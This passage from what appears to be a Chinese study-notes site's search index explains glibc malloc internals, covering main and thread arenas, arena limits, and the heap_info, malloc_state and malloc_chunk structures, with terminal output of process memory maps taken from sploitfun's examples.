\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e86 0x0806c000-0x0804b000=0x21000 \u4e2a\u5b57\u8282\u7684\u5806\u3002 \u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002 \u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk \u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531 glibc \u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b malloc \u4e4b\u524d \uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b 1 \u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b 1 \u76f8\u5173\u7684\u6808\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u4e2a\u7ebf\u7a0b malloc \u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b 1 \u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f 132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3a mmap \u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a 1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709 132KB \u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3a thread arena\u3002 \u6ce8\u610f\uff1a \u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e 128KB \u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55 arena \u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884c mmap \u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 After free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$","title":"\u591a\u7ebf\u7a0b\u652f\u6301"},{"location":"glibc-heap/Introduction_heap/#_6","text":"sploitfun","title":"\u53c2\u8003\u6587\u732e"},{"location":"glibc-heap/heap_structure/","text":"\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784 \u5185\u5bb9\u7edd\u5927\u90e8\u5206\u6765\u81eactf-wiki\uff0c\u6587\u7ae0\u7528\u4e8e\u81ea\u5df1\u5b66\u4e60\u8bb0\u5f55 \u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a \u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002 \u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002 \u5b8f\u89c2\u7ed3\u6784 32\u4f4d\u5185\u5b58\u5e03\u5c40 \u4ece\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4e3a\uff1a\u4e0d\u53ef\u8bbf\u95ee\u7684\u5185\u6838\u7a7a\u95f4\uff0c\u6808\u7a7a\u95f4\uff08\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u751f\u957f\uff09\uff0c\u5185\u5b58\u5e03\u5c40\u533a\uff0c\u5806\u7a7a\u95f4\uff08\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u751f\u957f\uff09\uff0cBSS\uff0c\u6570\u636e\u6bb5\uff0c\u6587\u672c\u6bb5\u3002\u672c\u62a5\u544a\u8ba8\u8bba\u8fdb\u7a0b\u7684\u6808\u7a7a\u95f4\u548c\u5806\u7a7a\u95f4\u7684\u5177\u4f53\u7ed3\u6784\u3002 64\u4f4d\u5185\u5b58\u5e03\u5c40 \u7528\u6237\u7a7a\u95f4\u7684\u5e03\u5c40\u548c32\u4f4d\u5dee\u522b\u5f88\u5c0f\u3002 \u5806\u7ba1\u7406\u4ecb\u7ecd 3 \u79cd\u6570\u636e\u7ed3\u6784 \u5728 glibc \u7684 malloc \u4e2d\u9488\u5bf9\u5806\u7ba1\u7406\uff0c\u4e3b\u8981\u6d89\u53ca\u5230\u4ee5\u4e0b 3 \u79cd\u6570\u636e\u7ed3\u6784\uff1a heap_info\uff08\u5373Heap Header\uff09\u5bf9\u5e94\u7ba1\u7406 heap malloc_state\uff08\u5373Arena Header\uff09 \u5bf9\u5e94\u7ba1\u7406 area malloc_chunk\uff08\u5373Chunk Header\uff09 \u5bf9\u5e94\u7ba1\u7406 chunk \u8fd9\u91cc\u5806\u7ba1\u7406\u4f1a\u51fa\u73b0\u5728\u591a\u7ebf\u7a0b\uff0c\u4e00\u822cpwn\u9898\u4e0d\u4f1a\u6d89\u53ca\u591a\u7ebf\u7a0b\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u90fd\u662f\u5728 main_area \u4e0a\u64cd\u4f5c\uff0c\u56e0\u6b64\u53ef\u9009\u62e9\u6027\u9605\u8bfb heap_info\u3001malloc_state\u3002 heap_info heap_info: \u5373Heap Header\uff0c\u56e0\u4e3a\u4e00\u4e2a thread arena \uff08\u6ce8\u610f\uff1a\u4e0d\u5305\u542b main thread \uff09\u53ef\u4ee5\u5305\u542b\u591a\u4e2aheaps\uff0c\u6240\u4ee5\u4e3a\u4e86\u4fbf\u4e8e\u7ba1\u7406\uff0c\u5c31\u7ed9\u6bcf\u4e2a heap \u5206\u914d\u4e00\u4e2a heap header\u3002\u90a3\u4e48\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4e00\u4e2athread arena\u4f1a\u5305\u542b\u591a\u4e2a heaps \u5462?\u5728\u5f53\u524d heap \u4e0d\u591f\u7528\u7684\u65f6\u5019\uff0cmalloc \u4f1a\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 mmap \u7533\u8bf7\u65b0\u7684\u5806\u7a7a\u95f4\uff0c\u65b0\u7684\u5806\u7a7a\u95f4\u4f1a\u88ab\u6dfb\u52a0\u5230\u5f53\u524dthread arena\u4e2d\uff0c\u4fbf\u4e8e\u7ba1\u7406\u3002 typedef struct _heap_info { mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ & MALLOC_ALIGN_MASK]; } heap_info; Arena \u6570\u91cf\u9650\u5236 \u4e3b\u7ebf\u7a0b\u548c\u5b50\u7ebf\u7a0b\u6709\u81ea\u5df1\u72ec\u7acb\u7684 arena \uff0c\u90a3\u4e48\u662f\u4e0d\u662f\u65e0\u8bba\u6709\u591a\u5c11\u4e2a\u7ebf\u7a0b\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u81ea\u5df1\u72ec\u7acb\u7684 arena \u5462\uff1f\u7b54\u6848\u662f\u5426\u5b9a\u7684\u3002\u4e8b\u5b9e\u4e0a\uff0c arena \u7684\u4e2a\u6570\u662f\u8ddf\u7cfb\u7edf\u4e2d\u5904\u7406\u5668\u6838\u5fc3\u4e2a\u6570\u76f8\u5173\u7684\uff0c\u5982\u4e0b\u8868\u6240\u793a\uff1a systems number of arena 32bits 2 x number of cpu cores + 1 64bits 8 x number of cpu cores + 1 Arena \u7ba1\u7406 \u5047\u8bbe\u6709\u5982\u4e0b\u60c5\u666f\uff1a\u4e00\u53f0\u53ea\u542b\u6709\u4e00\u4e2a\u5904\u7406\u5668\u6838\u5fc3\u7684\u673a\u5668\u5b89\u88c5\u6709 32 \u4f4d\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5176\u4e0a\u8fd0\u884c\u4e86\u4e00\u4e2a\u591a\u7ebf\u7a0b\u5e94\u7528\u7a0b\u5e8f\uff0c\u5171\u542b\u6709 4 \u4e2a\u7ebf\u7a0b\u2014\u2014\u4e3b\u7ebf\u7a0b\u548c\u4e09\u4e2a\u5b50\u7ebf\u7a0b\u3002\u663e\u7136\u7ebf\u7a0b\u4e2a\u6570\u5927\u4e8e\u7cfb\u7edf\u80fd\u7ef4\u62a4\u7684\u6700\u5927 arena \u4e2a\u6570\uff082 x \u6838\u5fc3\u6570 + 1= 3\uff09\uff0c\u90a3\u4e48\u6b64\u65f6 glibc \u7684 malloc \u5c31\u9700\u8981\u786e\u4fdd\u8fd9 4 \u4e2a\u7ebf\u7a0b\u80fd\u591f\u6b63\u786e\u5730\u5171\u4eab\u8fd9 3 \u4e2a arena \uff0c\u90a3\u4e48\u5b83\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462\uff1f \u5f53\u4e3b\u7ebf\u7a0b\u9996\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u4e3a\u5b83\u5206\u914d\u4e00\u4e2a main arena \uff0c\u800c\u4e0d\u9700\u8981\u4efb\u4f55\u9644\u52a0\u6761\u4ef6\u3002 \u5f53\u5b50\u7ebf\u7a0b 1 \u548c\u5b50\u7ebf\u7a0b 2 \u9996\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\uff0c glibc \u5b9e\u73b0\u7684 malloc \u4f1a\u5206\u522b\u4e3a\u6bcf\u4e2a\u5b50\u7ebf\u7a0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 thread arena \u3002\u6b64\u65f6\uff0c\u5404\u4e2a\u7ebf\u7a0b\u4e0e arena \u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u3002\u4f46\u662f\uff0c\u5f53\u7528\u6237\u7ebf\u7a0b 3 \u8c03\u7528 malloc \u7684\u65f6\u5019\u5c31\u51fa\u73b0\u95ee\u9898\u4e86\u3002\u56e0\u4e3a\u6b64\u65f6 glibc \u7684 malloc \u80fd\u7ef4\u62a4\u7684 arena \u4e2a\u6570\u5df2\u7ecf\u8fbe\u5230\u4e0a\u9650\uff0c\u65e0\u6cd5\u518d\u4e3a\u5b50\u7ebf\u7a0b 3 \u5206\u914d\u65b0\u7684 arena \u4e86\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u91cd\u590d\u4f7f\u7528\u5df2\u7ecf\u5206\u914d\u597d\u7684 3 \u4e2a arena \u4e2d\u7684\u4e00\u4e2a\uff08 main arena , arena1 \u6216\u8005 arena2 \uff09\u3002\u90a3\u4e48\u8be5\u9009\u62e9\u54ea\u4e2a arena \u8fdb\u884c\u91cd\u590d\u5229\u7528\u5462\uff1f glibc \u7684 malloc \u9075\u5faa\u4ee5\u4e0b\u89c4\u5219\uff1a \u9996\u5148\u5faa\u73af\u904d\u5386\u6240\u6709\u53ef\u7528\u7684 arena \uff0c\u5728\u904d\u5386\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5b83\u4f1a\u5c1d\u8bd5\u52a0\u9501\u8be5 arena \u3002\u5982\u679c\u6210\u529f\u52a0\u9501\uff08\u8be5 arena \u5f53\u524d\u5bf9\u5e94\u7684\u7ebf\u7a0b\u5e76\u672a\u4f7f\u7528\u5806\u5185\u5b58\u5219\u8868\u793a\u53ef\u52a0\u9501\uff09\uff0c\u6bd4\u5982\u5c06 main arena \u6210\u529f\u9501\u4f4f\uff0c\u90a3\u4e48\u5c31\u5c06 main arena \u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5373\u8868\u793a\u8be5 arena \u88ab\u5b50\u7ebf\u7a0b 3 \u5171\u4eab\u4f7f\u7528\u3002 \u5982\u679c\u6ca1\u80fd\u627e\u5230\u53ef\u7528\u7684 arena \uff0c\u90a3\u4e48\u5c31\u5c06\u5b50\u7ebf\u7a0b 3 \u7684 malloc \u64cd\u4f5c\u963b\u585e\uff0c\u76f4\u5230\u6709\u53ef\u7528\u7684 arena \u4e3a\u6b62\u3002 \u73b0\u5728\uff0c\u5982\u679c\u5b50\u7ebf\u7a0b 3 \u518d\u6b21\u8c03\u7528 malloc \u7684\u8bdd\uff0c glibc \u7684 malloc \u5c31\u4f1a\u5148\u5c1d\u8bd5\u4f7f\u7528\u6700\u8fd1\u8bbf\u95ee\u7684 arena \uff08\u6b64\u65f6\u4e3a main arena \uff09\u3002\u5982\u679c\u6b64\u65f6 main arena \u53ef\u7528\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\uff0c\u5426\u5219\u5c31\u5c06\u5b50\u7ebf\u7a0b 3 \u963b\u585e\uff0c\u76f4\u5230 main arena \u518d\u6b21\u53ef\u7528\u4e3a\u6b62\u3002 \u8fd9\u6837\u5b50\u7ebf\u7a0b 3 \u4e0e\u4e3b\u7ebf\u7a0b\u5c31\u5171\u4eab main arena \u4e86\u3002\u81f3\u4e8e\u5176\u4ed6\u66f4\u590d\u6742\u7684\u60c5\u51b5\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 malloc_state malloc_state: \u5373Arena Header\uff0c\u7528\u4e8e\u8868\u793a area \u7684\u4fe1\u606f\uff0c\u6bcf\u4e2athread\u53ea\u542b\u6709\u4e00\u4e2aArena Header\u3002Arena Header\u5305\u542bbins\u7684\u4fe1\u606f\u3001top chunk\u4ee5\u53ca\u6700\u540e\u4e00\u4e2aremainder chunk\u7b49(\u8fd9\u4e9b\u6982\u5ff5\u4f1a\u5728\u540e\u6587\u8be6\u7ec6\u4ecb\u7ecd): struct malloc_state { /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; }; malloc_chunk malloc_chunk: \u5373Chunk Header\uff0c\u4e00\u4e2aheap\u88ab\u5206\u4e3a\u591a\u4e2achunk\uff0c\u81f3\u4e8e\u6bcf\u4e2achunk\u7684\u5927\u5c0f\uff0c\u8fd9\u662f\u6839\u636e\u7528\u6237\u7684\u8bf7\u6c42\u51b3\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u7528\u6237\u8c03\u7528malloc(size_t size)\u4f20\u9012\u7684size\u53c2\u6570\u201c\u5c31\u662f\u201dchunk\u7684\u5927\u5c0f(\u8fd9\u91cc\u7ed9\u201c\u5c31\u662f\u201d\u52a0\u4e0a\u5f15\u53f7\uff0c\u8bf4\u660e\u8fd9\u79cd\u8868\u793a\u5e76\u4e0d\u51c6\u786e\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\u7406\u89e3\u5c31\u6682\u65f6\u8fd9\u4e48\u63cf\u8ff0\u4e86\uff0c\u8be6\u7ec6\u8bf4\u660e\u89c1\u540e\u6587)\u3002\u6bcf\u4e2achunk\u90fd\u7531\u4e00\u4e2a\u7ed3\u6784\u4f53malloc_chunk\u8868\u793a\uff1a struct malloc_chunk { /* #define INTERNAL_SIZE_T size_t */ INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. \u8fd9\u4e24\u4e2a\u6307\u9488\u53ea\u5728free chunk\u4e2d\u5b58\u5728*/ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; \u5173\u4e8e\u4e0a\u8ff0\u7684\u7ed3\u6784\uff08malloc_chunk\u4e3b\u7ebf\u7a0b\u4e5f\u7528\u5230\uff09\uff0c\u9488\u5bf9\u5b50\u7ebf\u7a0b\u7684\uff0c\u4e3b\u7ebf\u7a0b\u548c\u5b50\u7ebf\u7a0b\u6709\u4e00\u4e9b\u4e0d\u540c\uff1a \u4e3b\u7ebf\u7a0b\u7684\u5806\u4e0d\u662f\u5206\u914d\u5728\u5185\u5b58\u6620\u5c04\u533a\uff0c\u800c\u662f\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u5806\u533a\uff0c\u56e0\u6b64\u4e0d\u542b\u6709\u591a\u4e2a heap \u6240\u4ee5\u4e5f\u5c31\u4e0d\u542b\u6709 heap_info \u7ed3\u6784\u4f53\u3002\u5f53\u9700\u8981\u66f4\u591a\u5806\u7a7a\u95f4\u7684\u65f6\u5019\uff0c\u76f4\u63a5\u901a\u8fc7\u589e\u957f brk \u6307\u9488\u6765\u83b7\u53d6\u66f4\u591a\u7684\u7a7a\u95f4\uff0c\u76f4\u5230\u5b83\u78b0\u5230\u5185\u5b58\u6620\u5c04\u533a\u57df\uff08mapping\uff09\u4e3a\u6b62\u3002 \u4e0d\u540c\u4e8e thread arena \uff0c\u4e3b\u7ebf\u7a0b\u7684 main arena \u7684 arena header \u5e76\u4e0d\u5728\u5806\u533a\u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\u5b83\u5c5e\u4e8e libc.so \u7684 data segment \u533a\u57df\u3002 heap segment\u4e0earena\u5173\u7cfb \u9996\u5148\uff0c\u901a\u8fc7\u5185\u5b58\u5206\u5e03\u56fe\u7406\u6e05malloc_state\u4e0eheap_info\u4e4b\u95f4\u7684\u7ec4\u7ec7\u5173\u7cfb\u3002 \u4e0b\u56fe\u662f\u53ea\u6709\u4e00\u4e2aheap segment\u7684main arena\u548cthread arena\u7684\u5185\u5b58\u5206\u5e03\u56fe\uff1a \u4e0b\u56fe\u662f\u4e00\u4e2athread arena\u4e2d\u542b\u6709\u591a\u4e2aheap segments\u7684\u60c5\u51b5\uff1a \u4ece\u4e0a\u56fe\u53ef\u4ee5\u770b\u51fa\uff0cthread arena\u53ea\u542b\u6709\u4e00\u4e2amalloc_state(\u5373arena header)\uff0c\u5374\u6709\u4e24\u4e2aheap_info(\u5373heap header)\u3002\u7531\u4e8e\u4e24\u4e2aheap segments\u662f\u901a\u8fc7mmap\u5206\u914d\u7684\u5185\u5b58\uff0c\u4e24\u8005\u5728\u5185\u5b58\u5e03\u5c40\u4e0a\u5e76\u4e0d\u76f8\u90bb\u800c\u662f\u5206\u5c5e\u4e8e\u4e0d\u540c\u7684\u5185\u5b58\u533a\u95f4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4fbf\u4e8e\u7ba1\u7406\uff0clibc malloc\u5c06\u7b2c\u4e8c\u4e2aheap_info\u7ed3\u6784\u4f53\u7684prev\u6210\u5458\u6307\u5411\u4e86\u7b2c\u4e00\u4e2aheap_info\u7ed3\u6784\u4f53\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u5373ar_ptr\u6210\u5458\uff09\uff0c\u800c\u7b2c\u4e00\u4e2aheap_info\u7ed3\u6784\u4f53\u7684ar_ptr\u6210\u5458\u6307\u5411\u4e86malloc_state\uff0c\u8fd9\u6837\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u65b9\u4fbf\u540e\u7eed\u7ba1\u7406\u3002 \u5fae\u89c2\u7ed3\u6784 chunk \u4ecb\u7ecd \u6982\u8ff0 \u5728 glibc malloc \u4e2d\u5c06\u6574\u4e2a\u5806\u5185\u5b58\u7a7a\u95f4\u5206\u6210\u4e86\u8fde\u7eed\u7684\u3001\u5927\u5c0f\u4e0d\u4e00\u7684 chunk \uff0c\u5373\u5bf9\u4e8e\u5806\u5185\u5b58\u7ba1\u7406\u800c\u8a00 chunk \u5c31\u662f\u6700\u5c0f\u64cd\u4f5c\u5355\u4f4d\u3002 chunk \u603b\u5171\u5206\u4e3a 4 \u5927\u7c7b\uff1a allocated chunk free chunk top chunk last remainder chunk \u4ece\u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u6240\u6709\u7c7b\u578b\u7684 chunk \u90fd\u662f\u5185\u5b58\u4e2d\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\uff0c\u53ea\u662f\u901a\u8fc7\u8be5\u533a\u57df\u4e2d\u7279\u5b9a\u4f4d\u7f6e\u7684\u67d0\u4e9b\u6807\u8bc6\u7b26\u52a0\u4ee5\u533a\u5206\u3002\u4e3a\u4e86\u7b80\u4fbf\uff0c\u4e5f\u53ef\u4ee5\u5c06\u8fd9 4 \u5927\u7c7b chunk \u7b80\u5316\u4e3a 2 \u7c7b\uff1a allocated chunk \u4ee5\u53ca free chunk \uff0c\u524d\u8005\u8868\u793a\u5df2\u7ecf\u5206\u914d\u7ed9\u7528\u6237\u4f7f\u7528\u7684 chunk \uff0c\u540e\u8005\u8868\u793a\u672a\u4f7f\u7528\u7684 chunk \u3002 